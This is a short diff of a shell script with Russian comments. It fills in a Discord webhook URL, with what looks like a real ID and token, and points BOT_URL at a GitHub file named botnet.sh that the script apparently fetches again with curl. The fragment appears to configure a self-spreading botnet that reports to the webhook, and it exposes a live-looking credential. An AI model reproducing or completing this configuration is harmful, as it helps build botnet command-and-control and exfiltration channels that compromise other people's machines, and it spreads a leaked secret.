@@ -5,7 +5,7 @@
 # ==========================================
 
 # Твой Discord Webhook
-WEBHOOK="https://discord.com/api/webhooks/ТВОЙ_ID/ТВОЙ_ТОКЕН"
+WEBHOOK="https://discord.com/api/webhooks/1574870843085955124/RYOu5Y9Xv-9bjUAzqpfV6po-gRqUchf1RpjktbQKWE6MeTS6QDtkH_dXm7y_abW6stPQ"
 
 # Ссылка на этот же скрипт (используем curl, он есть везде)
 BOT_URL="https://github.com/traiantadgs-ops/exe/blob/main/botnet.sh"
